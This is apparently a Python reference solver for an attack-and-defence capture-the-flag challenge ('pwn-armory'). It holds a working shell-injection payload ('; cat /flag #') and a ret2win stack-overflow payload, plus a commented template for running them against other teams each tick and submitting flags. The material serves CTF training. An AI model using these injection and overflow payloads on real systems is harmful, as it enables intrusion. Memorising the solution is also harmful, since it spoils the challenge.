#!/usr/bin/env python3
"""
Reference exploit(s) for pwn-armory.

Two independent flag-leak paths against one target:
  * cmd_injection — option 7 (Ping) shells out -> `; cat /flag` (most robust).
  * ret2win       — option 0 (Set nick) stack overflow -> print_flag()
                    (no canary/PIE; print_flag@0x401226, +1 for 16B alignment).

In A&D you run `exploit()` against every other team's instance each tick and
submit the captured flags via the in-game Toolkit API (see the template at the
bottom).

    python3 solve.py <ip> <port>
"""
import re
import socket
import struct
import sys
import time

FLAG_RE = re.compile(rb"flag\{[^}]*\}")
PRINT_FLAG = 0x401226  # nm armory | grep print_flag ; +1 used for stack alignment
OFFSET = 40            # nick[32] @ rbp-0x20 -> saved RIP at +40


def _flag(data):
    m = FLAG_RE.search(data or b"")
    return m.group(0).decode() if m else None


def _recv_all(s, t=1.5):
    s.settimeout(t)
    buf = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            buf += c
    except socket.timeout:
        pass
    return buf


def cmd_injection(ip, port):
    s = socket.create_connection((ip, port), timeout=5)
    s.recv(4096)                       # banner / prompt
    s.sendall(b"7\n; cat /flag #\n")   # Ping -> shell injection
    flag = _flag(_recv_all(s))
    s.close()
    return flag


def ret2win(ip, port):
    s = socket.create_connection((ip, port), timeout=5)
    s.recv(4096)
    s.sendall(b"0\n")                  # Set nick
    s.recv(4096)
    s.sendall(b"A" * OFFSET + struct.pack("<Q", PRINT_FLAG + 1) + b"\n")
    time.sleep(0.3)
    flag = _flag(_recv_all(s))
    s.close()
    return flag


def exploit(ip, port):
    for fn in (cmd_injection, ret2win):
        try:
            flag = fn(ip, port)
            if flag:
                return flag
        except OSError:
            continue
    return None


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <ip> <port>", file=sys.stderr)
        sys.exit(2)
    flag = exploit(sys.argv[1], int(sys.argv[2]))
    if flag:
        print(flag)
    else:
        print("no flag captured", file=sys.stderr)
        sys.exit(1)


# ---------------------------------------------------------------------------
# A&D batch submission (template pattern — fill in from the in-game Toolkit):
#
#   base, game_id, token = "https://ctf...", 1, "<bearer>"
#   import requests
#   targets = requests.get(f"{base}/api/Game/{game_id}/Ad/Targets",
#                          headers={"Authorization": f"Bearer {token}"}).json()
#   flags = [f for chal in targets["challenges"] for team in chal["teams"]
#            if team.get("ip") for f in [exploit(team["ip"], team["port"])] if f]
#   requests.post(f"{base}/api/Game/{game_id}/Ad/Submit",
#                 headers={"Authorization": f"Bearer {token}"},
#                 json={"flags": flags})
# ---------------------------------------------------------------------------
